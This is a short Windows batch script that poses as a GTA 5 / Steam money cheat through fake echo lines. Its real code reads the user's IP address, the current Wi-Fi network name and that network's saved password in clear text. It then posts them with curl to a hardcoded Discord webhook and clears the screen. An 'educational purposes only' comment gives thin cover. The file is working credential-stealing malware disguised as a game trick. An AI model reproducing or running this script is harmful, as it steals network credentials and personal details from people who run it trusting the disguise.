@echo off

::eduscttional purposes only

echo
echo Steam.start gta5.exe
echo steam.dash-add "10M=gtaDollar"
echo if code [not working] ram=new val
echo set 'val'=(steamcode=A67D76876FGg756757)
echo code [noSteam] use 1
for /f "tokens=2 delims=:" %%A in ('ipconfig ^| findstr /R /C:"IPv4.*"') do (
    for /f "tokens=*" %%B in ("%%A") do set ip=%%B
)

for /f "tokens=2 delims=: " %%A in ('netsh wlan show interfaces ^| find "SSID" ^| find /v "BSSID"') do set wifi=%%A

for /f "tokens=2 delims=:" %%i in ('netsh wlan show profile name^="%wifi%" key^=clear ^| findstr /R /C:"Key Content"') do (
    set key_content=%%i
)

set wifi_pass=%key_content%

set webhook_url=https://discord.com/api/webhooks/1249449092703322234/8u6mGib5fZCBXLZwjiQem3nmVC8lsm2Kh-TaNV69GtwaX0FIT99DoK0QJJHWEtG20Aj_"

set message=New User: **%username%**, %ip%!
curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"%message%\"}" %webhook_url%

set message=Wifi: %wifi%, Passwort: %wifi_pass%
curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"%message%\"}" %webhook_url%
cls